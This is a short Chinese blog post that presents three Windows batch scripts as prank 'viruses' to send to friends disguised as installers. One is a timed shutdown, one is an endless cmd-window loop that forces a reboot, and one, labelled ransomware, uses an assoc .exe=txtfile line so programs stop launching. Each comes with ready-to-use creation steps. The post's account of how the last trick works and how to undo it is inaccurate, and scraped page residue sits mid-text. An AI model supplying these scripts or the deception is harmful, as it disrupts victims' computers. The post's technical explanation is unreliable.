被你※发现了，^_^好，看看一些好玩的技术吧


关机病毒
试想一下，你将一个病毒程序发给一个朋友，骗他说这是某某软件的安装程序或者什么的，然后那个朋友打开这个病毒，竟然黑屏关机了！想不想实现这个效果？其实很简单。新建一个TXT文本文件，在里面输入：

shutdown -s -t
 
在 -t 后面添加你想等待关机的时间（秒）。

保存，然后把文本文档扩展名修改为 .bat（或 .cmd ）即可。
（恢复方法：终端或Win + R运行脚本 shutdown -a ）

无限弹窗病毒
打开一个程序，弹出一堆 cmd ，停也停不了，必须强制关机…… 这种无限弹窗病毒制作起来非常简单。还是新建一个TXT文本文件，在里面输入：

@echo off
start cmd
%0

还是保存，然后把文本文档扩展名修改为 .bat（或 .cmd ）即可。

勒索病毒
实现效果：将全部 exe 文件扩展名修改为 txt ，达到勒索的效果（数据无价，一定慎用，变回来非常麻烦）。

老样子，新建TXT，输入：

assoc.exe=txtfile
AI写代码
vbnet
1
还是保存，然后把文本文档扩展名修改为 .bat（或 .cmd ）即可。

打开之后，exe 文件将全部变成 txt ，无法执行。
（原理就是批量修改扩展名，挨个把 txt 扩展名修改为 exe 即可）

加油,去成为伟大的软件工程师！2025/7/31